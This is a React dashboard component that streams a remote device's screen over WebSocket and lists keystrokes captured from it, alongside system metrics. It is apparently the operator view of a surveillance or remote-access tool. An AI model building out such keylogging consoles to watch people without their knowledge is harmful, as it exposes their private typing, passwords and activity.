import React, { useState, useEffect } from 'react';
import { Box, Typography, Paper, Grid, Button, List, ListItem, ListItemText, CircularProgress } from '@mui/material';
import { PlayArrow as PlayIcon, Stop as StopIcon } from '@mui/icons-material';
import useWebSocket from 'react-use-websocket';

const LiveMonitoring = () => {
  const [isStreaming, setIsStreaming] = useState(false);
  const [streamData, setStreamData] = useState(null);
  const [logs, setLogs] = useState([]);
  const [metrics, setMetrics] = useState(null);
  const [isConnected, setIsConnected] = useState(false);

  const { lastMessage, sendMessage, readyState } = useWebSocket('ws://localhost:8000/ws/device/1/monitor', {
    onOpen: () => setIsConnected(true),
    onClose: () => setIsConnected(false),
    shouldReconnect: (closeEvent) => true,
  });

  useEffect(() => {
    if (lastMessage) {
      try {
        const data = JSON.parse(lastMessage.data);
        switch (data.type) {
          case 'screen_update':
            setStreamData(data.data);
            break;
          case 'keylog_update':
            setLogs(prev => [...prev, { type: 'keystroke', data: data.data, timestamp: data.timestamp }]);
            break;
          case 'device_metrics':
            setMetrics(data);
            break;
          default:
            console.log('Unknown message type:', data.type);
        }
      } catch (error) {
        console.error('Failed to parse WebSocket message:', error);
      }
    }
  }, [lastMessage]);

  const handleStartStream = () => {
    setIsStreaming(true);
    sendMessage(JSON.stringify({ type: 'start_stream' }));
  };

  const handleStopStream = () => {
    setIsStreaming(false);
    sendMessage(JSON.stringify({ type: 'stop_stream' }));
    setStreamData(null);
  };

  return (
    <Box sx={{ flexGrow: 1, p: 3 }}>
      <Typography variant="h4" gutterBottom>
        Live Monitoring
        {!isConnected && (
          <CircularProgress size={20} sx={{ ml: 2 }} />
        )}
      </Typography>
      <Grid container spacing={3}>
        <Grid item xs={12} lg={8}>
          <Paper sx={{ p: 2, height: '70vh', display: 'flex', flexDirection: 'column' }}>
            <Box sx={{ display: 'flex', justifyContent: 'space-between', mb: 2 }}>
              <Typography variant="h6">Screen Share</Typography>
              <Box>
                <Button
                  variant="contained"
                  color={isStreaming ? 'error' : 'primary'}
                  startIcon={isStreaming ? <StopIcon /> : <PlayIcon />}
                  onClick={isStreaming ? handleStopStream : handleStartStream}
                  disabled={!isConnected}
                >
                  {isStreaming ? 'Stop Stream' : 'Start Stream'}
                </Button>
              </Box>
            </Box>
            <Box
              sx={{
                flex: 1,
                bgcolor: 'black',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: 'white',
                borderRadius: 1,
              }}
            >
              {streamData ? (
                <img src={`data:image/jpeg;base64,${streamData}`} alt="Live Stream" style={{ maxWidth: '100%', maxHeight: '100%' }} />
              ) : (
                <Typography>{isConnected ? 'Stream not active' : 'Connecting...'}</Typography>
              )}
            </Box>
          </Paper>
        </Grid>
        <Grid item xs={12} lg={4}>
          <Paper sx={{ p: 2, height: '70vh', display: 'flex', flexDirection: 'column' }}>
            <Typography variant="h6" gutterBottom>
              Device Metrics & Logs
            </Typography>
            <Box sx={{ flex: 1, overflow: 'auto' }}>
              <List dense>
                {logs.map((log, index) => (
                  <ListItem key={index}>
                    <ListItemText
                      primary={log.type === 'keystroke' ? `Keystroke: ${log.data}` : `Event: ${log.type}`}
                      secondary={new Date(log.timestamp).toLocaleString()}
                    />
                  </ListItem>
                ))}
              </List>
            </Box>
            {metrics && (
              <Box sx={{ mt: 2, p: 2, bgcolor: 'background.default', borderRadius: 1 }}>
                <Typography variant="subtitle2" gutterBottom>
                  System Metrics
                </Typography>
                <Typography variant="body2">
                  CPU: {metrics.cpu}%
                </Typography>
                <Typography variant="body2">
                  Memory: {metrics.memory}%
                </Typography>
                <Typography variant="body2">
                  Disk: {metrics.disk}%
                </Typography>
              </Box>
            )}
          </Paper>
        </Grid>
      </Grid>
    </Box>
  );
};

export default LiveMonitoring;